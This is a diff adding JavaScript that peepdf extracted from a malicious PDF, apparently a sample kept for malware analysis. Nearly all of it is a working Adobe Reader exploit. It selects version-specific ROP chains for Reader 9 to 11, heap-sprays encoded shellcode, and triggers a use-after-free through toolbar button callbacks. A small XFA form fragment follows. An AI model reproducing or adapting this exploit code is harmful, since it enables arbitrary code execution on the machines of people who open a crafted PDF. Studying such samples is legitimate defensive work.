@@ -1,0 +1,111 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+// comment
+
+
+function heapSpray(str, str_addr, r_addr) {
+    var aaa = unescape("%u0c0c");
+    aaa += aaa;
+    while ((aaa.length + 24 + 4) < (0x8000 + 0x8000)) aaa += aaa;
+    var i1 = r_addr - 0x24;
+    var bbb = aaa.substring(0, i1 / 2);
+    var sa = str_addr;
+    while (sa.length < (0x0c0c - r_addr)) sa += sa;
+    bbb += sa;
+    bbb += aaa;
+    var i11 = 0x0c0c - 0x24;
+    bbb = bbb.substring(0, i11 / 2);
+    bbb += str;
+    bbb += aaa;
+    var i2 = 0x4000 + 0xc000;
+    var ccc = bbb.substring(0, i2 / 2);
+    while (ccc.length < (0x40000 + 0x40000)) ccc += ccc;
+    var i3 = (0x1020 - 0x08) / 2;
+    var ddd = ccc.substring(0, 0x80000 - i3);
+    var eee = new Array();
+    for (i = 0; i < 0x1e0 + 0x10; i++) eee[i] = ddd + "s";
+    return;
+}
+
+var shellcode = unescape("%ucbbf%ufb01%ud9c4%ud9e9%u2474%u58f4%uc931%u36b1%uc083%u3104%u0f78%u7803%ue3c4%u7c0e%ue56d%u8d93%u364b%u1a8a%u334f%ud076%u0a46%u27a6%u791b%uac3a%u8267%u237f%u76c2%u5be0%u84f7%u8540%u017c%uddc5%u0b39%u45f7%uac36%u2d8a%u08a8%u32bc%ub1ac%uf0fa%ue68e%uad8c%u23d0%u9b6a%u4bb0%uc775%u21e7%u297d%u453a%ud0d6%u655e%uab7b%u6588%u6f52%u0dc3%u0451%ua4dd%u8af8%u3180%ub11c%uf118%u5225%u797a%ucf95%u731f%u45f3%u2d41%u9ba3%u96d0%u39c9%u2767%u9426%u7e87%ub0ea%ude49%ub15d%u2730%u7f81%u3950%uc26d%uec63%u9c22%u35bd%u0188%uf712%ue912%u9db3%u2693%u2247%ud17a%u9ee4%ua387%uf806%u4b07%uea4f%u693c%uacf3%uc6a2%u0995%u2a4d%ue05f%u466c%u891e%ub014%ua15d%u40f2%uab88%u7e40%ufaca%u7fd2%u57ae%u79bb%u15dd%u8557%u2e19%ufbaf%udf08%u2188%ueff8%ue192");
+var executable = "";
+var rop9 = unescape("%u313d%u4a82%ua713%u4a82%u1f90%u4a80%u9038%u4a84%u7e7d%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u155a%u4a80%u3a84%u4a84%ud4de%u4a82%u1f90%u4a80%u76aa%u4a84%u9030%u4a84%u4122%u4a84%u76aa%u4a84%u7e7d%u4a80%u3178%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u3a82%u4a84%u6c5e%u4a84%u76ab%u4a84%ue883%ubf9c%u0400%u0000%ue342%u1cc7%u7984%u4a81%u3178%u4a81");
+var rop10 = unescape("%u6015%u4a82%ue090%u4a82%u007d%u4a82%u0038%u4a85%u46d5%u4a82%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u5016%u4a80%u420c%u4a84%u4241%u4a81%u007d%u4a82%u6015%u4a82%u0030%u4a85%ub49d%u4a84%u6015%u4a82%u46d5%u4a82%u4197%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u4013%u4a81%ue036%u4a84%ua8df%u4a82%u356b%u1f4b%u0400%u0000%u64ee%u08aa%u8b31%u4a81%u4197%u4a81");
+var rop11 = unescape("%u822c%u4a85%uf129%u4a82%u597f%u4a85%u6038%u4a86%uf1d5%u4a83%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u1000%u0000%u0000%u0000%u5093%u4a85%ufb4b%u3aa9%u0030%u4a85%u597f%u4a85%u0031%u4a85%u709c%u8bb3%u822c%u4a85%uf1d5%u4a83%ud4f8%u4a85%u6030%u4a86%u4864%u4a81%u0026%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u4856%u4a81%u05a0%u4a85%u0bc4%u4a86%u05a0%u4a85%uc376%u4a81%u63d0%u4a84%u0400%u0000%ud4f8%u4a85%ud4f8%u4a85%u4864%u4a81");
+var r11 = false;
+var vulnerable = true;
+
+var obj_size;
+var rop;
+var ret_addr;
+var rop_addr;
+var r_addr;
+
+if (app.viewerVersion >= 9 && app.viewerVersion < 10 && app.viewerVersion <= 9.504) {
+    obj_size = 0x330 + 0x1c;
+    rop = rop9;
+    ret_addr = unescape("%ua83e%u4a82");
+    rop_addr = unescape("%u08e8%u0c0c");
+    r_addr = 0x08e8;
+} else if (app.viewerVersion >= 10 && app.viewerVersion < 11 && app.viewerVersion <= 10.106) {
+    obj_size = 0x360 + 0x1c;
+    rop = rop10;
+    rop_addr = unescape("%u08e4%u0c0c");
+    r_addr = 0x08e4;
+    ret_addr = unescape("%ua8df%u4a82");
+} else if (app.viewerVersion >= 11 && app.viewerVersion <= 11.002) {
+    r11 = true;
+    obj_size = 0x370;
+    rop = rop11;
+    rop_addr = unescape("%u08a8%u0c0c");
+    r_addr = 0x08a8;
+    ret_addr = unescape("%u8003%u4a84");
+} else {
+    vulnerable = false;
+}
+
+if (vulnerable) {
+    var payload = rop + shellcode;
+    heapSpray(payload, ret_addr, r_addr);
+
+    var part1 = "";
+    if (!r11) {
+        for (i = 0; i < 0x1c / 2; i++) part1 += unescape("%u4141");
+    }
+    part1 += rop_addr;
+    var part2 = "";
+    var part2_len = obj_size - part1.length * 2;
+    for (i = 0; i < part2_len / 2 - 1; i++) part2 += unescape("%u4141");
+    var arr = new Array();
+
+    removeButtonFunc = function() {
+        app.removeToolButton({
+            cName: "evil"
+        });
+
+        for (i = 0; i < 10; i++) arr[i] = part1.concat(part2);
+    }
+
+    addButtonFunc = function() {
+        app.addToolButton({
+            cName: "xxx",
+            cExec: "1",
+            cEnable: "removeButtonFunc();"
+        });
+    }
+
+    app.addToolButton({
+        cName: "evil",
+        cExec: "1",
+        cEnable: "addButtonFunc();"
+    });
+
+}
+
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
